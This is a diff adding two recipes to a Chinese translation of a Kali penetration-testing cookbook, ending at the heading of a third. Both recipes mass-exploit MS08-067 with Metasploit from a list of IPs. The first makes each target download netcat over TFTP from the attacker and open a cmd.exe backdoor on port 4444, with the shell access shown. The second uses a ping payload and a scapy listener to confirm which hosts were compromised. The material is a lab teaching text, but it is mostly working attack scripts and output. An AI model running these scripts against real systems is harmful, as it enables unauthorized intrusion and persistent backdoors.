@@ -322,7 +322,7 @@ Nessuscmd 是 Nessus 漏洞扫描器中包含的命令行工具。 此工具可�
 
 ### 准备
 
-要使用此秘籍中演示的脚本，您=你需要访问多个系统，每个系统都具有可使用 Metasploit 利用的相同漏洞。 提供的示例复制了运行 Windows XP 漏洞版本的 VM，来生成 MS08-067 漏洞的三个实例。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。 此外，本节还需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章的“使用文本编辑器（VIM 和 Nano）”秘籍。
+要使用此秘籍中演示的脚本，你需要访问多个系统，每个系统都具有可使用 Metasploit 利用的相同漏洞。 提供的示例复制了运行 Windows XP 漏洞版本的 VM，来生成 MS08-067 漏洞的三个实例。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。 此外，本节还需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章的“使用文本编辑器（VIM 和 Nano）”秘籍。
 
 ### 操作步骤
 
@@ -400,3 +400,148 @@ meterpreter >
 ### 工作原理
 
 通过对每个进程使用单独的终端，可以使用单个 bash 脚本执行多个并行利用。 另外，通过使用为`LPORT`分配的递增值，可以同时执行多个反向 meterpreter shell。
+
+## 8.6 使用可执行后门的多线程 MSF 利用
+
+该秘籍演示了如何使用 bash ，在多个系统上利用单个漏洞，并在每个系统上打开一个后门。 后门包括在目标系统上暂存 Netcat 可执行文件，并打开监听服务，在收到连接后执行`cmd.exe`。
+
+### 准备
+
+要使用此秘籍中演示的脚本，你需要访问多个系统，每个系统都具有可使用 Metasploit 利用的相同漏洞。 提供的示例复制了运行 Windows XP 漏洞版本的 VM，来生成 MS08-067 漏洞的三个实例。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。 此外，本节还需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章的“使用文本编辑器（VIM 和 Nano）”秘籍。
+
+### 操作步骤
+
+下面的示例演示了如何使用 bash 脚本同时利用单个漏洞的多个实例。 特别是，此脚本可用于通过引用 IP 地址的输入列表，来利用 MS08-067 NetAPI 漏洞的多个实例：
+
+```sh
+#!/bin/bash
+if [ ! $1 ]; then echo "Usage: #./script <host file>"; 
+exit; fi
+
+iplist=$1
+
+for ip in $(cat $iplist) 
+do   
+    gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/exec CMD="cmd.exe /c \"tftp -i 172.16.36.239 GET nc.exe && nc.exe -lvp 4444 -e cmd.exe\"" RHOST=$ip E   
+    echo "Exploiting $ip and creating backdoor on TCP port 4444" 
+done 
+```
+
+此脚本与上一个秘籍中讨论的脚本不同，因为此脚本在每个目标上安装一个后门。 在每个被利用的系统上，会执行一个载荷，它使用集成的简单文件传输协议（TFTP）客户端来抓取 Netcat 可执行文件，然后使用它在 TCP 端口 4444 上打开一个`cmd.exe`监听终端服务。为此， TFTP 服务将需要在 Kali 系统上运行。 这可以通过执行以下命令来完成：
+
+```
+root@KaliLinux:~# atftpd --daemon --port 69 /tmp 
+root@KaliLinux:~# cp /usr/share/windows-binaries/nc.exe /tmp/nc.exe 
+```
+
+第一个命令在 UDP 端口 69 上启动 TFTP 服务，服务目录在`/ tmp`中。 第二个命令用于将 Netcat 可执行文件从`Windows-binaries`文件夹复制到 TFTP 目录。 现在我们执行`./multipwn.sh` bash shell：
+
+```
+root@KaliLinux:~# ./multipwn.sh 
+Usage: #./script <host file> 
+root@KaliLinux:~# ./multipwn.sh iplist.txt 
+Exploiting 172.16.36.132 and creating backdoor on TCP port 4444 
+Exploiting 172.16.36.158 and creating backdoor on TCP port 4444 
+Exploiting 172.16.36.225 and creating backdoor on TCP port 4444 
+```
+
+如果在不提供任何参数的情况下执行脚本，脚本将输出相应的用法。 该使用描述表明，该脚本应该以一个参数执行，该参数指定了包含目标 IP 地址列表的文本文件的文件名。 一旦以这个参数执行，会开始弹出一系列新的终端。 这些终端中的每一个将运行输入列表中的 IP 地址之一的利用序列。 原始执行终端在它们被执行时输出进程列表，并且表明在每个终端上创建后门。 在每个终端中完成利用序列之后，Netcat 可以用于连接到由载荷打开的远程服务：
+
+```
+root@KaliLinux:~# nc -nv 172.16.36.225 4444 
+(UNKNOWN) [172.16.36.225] 4444 (?) open 
+Microsoft Windows XP [Version 5.1.2600] 
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\>
+
+```
+
+在提供的示例中，IP 地址为`172.16.36.225`的被利用的系统上的 TCP 4444 端口的连接，会生成可远程访问的`cmd.exe`终端服务。
+
+### 工作原理
+
+Netcat 是一个功能强大的工具，可以用于各种目的。 虽然这是远程执行服务的有效方式，但不建议在生产系统上使用此技术。 这是因为任何可以与监听端口建立 TCP 连接的人都可以访问 Netcat 打开的后门。
+
+## 8.7 使用 ICMP 验证多线程 MSF 利用
+
+该秘籍演示了如何使用 bash 利用跨多个系统的单个漏洞，并使用 ICMP 流量验证每个漏洞的成功利用。 这种技术需要很少的开销，并且可以轻易用于收集可利用的系统列表。
+
+### 准备
+
+要使用此秘籍中演示的脚本，你需要访问多个系统，每个系统都具有可使用 Metasploit 利用的相同漏洞。 提供的示例复制了运行 Windows XP 漏洞版本的 VM，来生成 MS08-067 漏洞的三个实例。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。 此外，本节还需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章的“使用文本编辑器（VIM 和 Nano）”秘籍。
+
+### 操作步骤
+
+下面的示例演示了如何使用 bash 脚本同时利用单个漏洞的多个实例。 特别是，此脚本可用于通过引用 IP 地址的输入列表来利用 MS08-067 NetAPI 漏洞的多个实例：
+
+```sh
+#!/bin/bash
+if [ ! $1 ]; then echo "Usage: #./script <host file>"; 
+exit; fi
+
+iplist=$1
+
+for ip in $(cat $iplist)
+do   
+    gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/exec CMD="cmd.exe /c ping \"172.16.36.239 -n 1 -i 15\"" 
+    RHOST=$ip E   
+    echo "Exploiting $ip and pinging" 
+done 
+```
+
+此脚本与上一个秘籍中讨论的脚本不同，因为载荷仅仅从被利用系统向攻击系统发回 ICMP 回响请求。 在执行`ping`命令并使用`-i`选项来指定生存时间（TTL）为15 时。此备用TTL值用于区分利用生成的流量与正常 ICMP 流量。 还应该执行定制的 Python 监听器脚本，通过接收 ICMP 流量来识别被利用的系统。 这个脚本如下：
+
+```py
+#!/usr/bin/python
+
+from scapy.all import * 
+import logging 
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+def rules(pkt):   
+    try:      
+        if ((pkt[IP].dst=="172.16.36.239") and (pkt[ICMP]) and pkt[IP]. ttl <= 15):         
+            print str(pkt[IP].src) + " is exploitable"      
+    except:         
+        pass
+
+print "Listening for Incoming ICMP Traffic. Use Ctrl+C to stop scanning" 
+sniff(lfilter=rules,store=0) 
+```
+
+脚本侦听所有传入的流量。 当接收到 TTL 值为 15或 更小的 ICMP 数据包时，脚本将系统标记为可利用。
+
+```
+root@KaliLinux:~# ./listener.py 
+Listening for Incoming ICMP Traffic. Use Ctrl+C to stop scanning 
+```
+
+Python流量监听器应该首先执行。 脚本最初不应生成输出。 此脚本应该在开发过程的整个时间内持续运行。 一旦脚本运行，应该启动 bash 利用脚本。
+
+```
+root@KaliLinux:~# ./multipwn.sh iplist.txt 
+Exploiting 172.16.36.132 and pinging 
+Exploiting 172.16.36.158 and pinging 
+Exploiting 172.16.36.225 and pinging
+
+```
+
+当执行脚本时，原始终端 shell 会显示每个系统正在被利用，并且正在执行`ping`序列。 还将为输入列表中的每个 IP 地址打开一个新的 GNOME 终端。 当每个利用过程完成时，应该从目标系统发起 ICMP 回响请求：
+
+```
+root@KaliLinux:~# ./listener.py 
+Listening for Incoming ICMP Traffic. Use Ctrl+C to stop scanning 
+172.16.36.132 is exploitable 
+172.16.36.158 is exploitable 
+172.16.36.225 is exploitable
+```
+
+假设攻击成功，Python 监听脚本会识别生成的流量，并将 ICMP 流量的每个源 IP 地址列为可利用。
+
+### 工作原理
+
+ICMP 流量似乎是一种用于验证目标系统的可利用性的非直观方式。 然而，它实际上工作得很好。 单个 ICMP 回响请求在目标系统上没有留下任何利用的痕迹，并且不需要过多的开销。 此外，将 TTL 值设为 15 不太可能产生误报，因为几乎所有系统都以 128 或更高的TTL值开始。
+
+## 8.8 创建管理账户的多线程 MSF 利用
+
